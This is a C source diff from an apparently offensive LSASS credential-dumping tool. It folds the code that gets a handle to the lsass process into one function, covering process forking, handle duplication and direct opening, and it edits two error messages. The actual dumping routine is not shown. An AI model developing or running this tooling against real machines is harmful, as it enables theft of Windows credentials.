@@ -915,36 +915,11 @@ void go(char* args, int length)
         return;
     }
 
-    HANDLE hProcess;
-    if (pid)
-    {
-        if (fork)
-        {
-            hProcess = fork_lsass_process(
-                pid
-            );
-        }
-        else if (dup)
-        {
-            hProcess = duplicate_lsass_handle(
-                pid
-            );
-        }
-        else
-        {
-            hProcess = get_process_handle(
-                pid,
-                LSASS_PERMISSIONS,
-                FALSE
-            );
-        }
-    }
-    else
-    {
-        hProcess = find_lsass(
-            LSASS_PERMISSIONS
-        );
-    }
+    HANDLE hProcess = obtain_lsass_handle(
+        pid,
+        fork,
+        dup
+    );
     if (!hProcess)
         return;
 
@@ -1132,13 +1107,13 @@ int main(int argc, char* argv[])
 
     if (fork && !pid)
     {
-        printf("Process forking requires a PID\n");
+        printf("Process forking requires a PID. Run with --getpid first.\n");
         return -1;
     }
 
     if (dup && !pid)
     {
-        printf("Handle duplication requires a PID\n");
+        printf("Handle duplication requires a PID. Run with --getpid first.\n");
         return -1;
     }
 
@@ -1167,36 +1142,11 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    HANDLE hProcess;
-    if (pid)
-    {
-        if (fork)
-        {
-            hProcess = fork_lsass_process(
-                pid
-            );
-        }
-        else if (dup)
-        {
-            hProcess = duplicate_lsass_handle(
-                pid
-            );
-        }
-        else
-        {
-            hProcess = get_process_handle(
-                pid,
-                LSASS_PERMISSIONS,
-                FALSE
-            );
-        }
-    }
-    else
-    {
-        hProcess = find_lsass(
-            LSASS_PERMISSIONS
-        );
-    }
+    HANDLE hProcess = obtain_lsass_handle(
+        pid,
+        fork,
+        dup
+    );
     if (!hProcess)
         return -1;
 
